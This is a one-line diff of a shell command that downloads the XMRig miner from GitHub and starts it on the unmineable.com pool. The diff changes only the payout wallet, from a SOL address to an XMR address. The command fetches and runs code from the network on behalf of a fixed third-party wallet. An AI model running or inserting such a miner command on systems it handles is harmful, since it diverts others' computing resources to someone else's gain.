@@ -1,1 +1,1 @@
-wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz && tar -xvf xmrig-6.17.0-linux-x64.tar.gz && cd xmrig-6.17.0 && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u SOL:6QaupgXMf3cPcd2HajbdA6YBdd7vHHuPdEaSGhKC3pEa -p x
+wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz && tar -xvf xmrig-6.17.0-linux-x64.tar.gz && cd xmrig-6.17.0 && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u XMR:48ha7VuWQPoEe8JKaetL9ncPQ4uKX6dYmjZkCkmVKLr5gaVn6vHktcP6d9kG3qzqLzWyuCdqxCCsVNuWfaBEqDwXUW1JuGU -p x
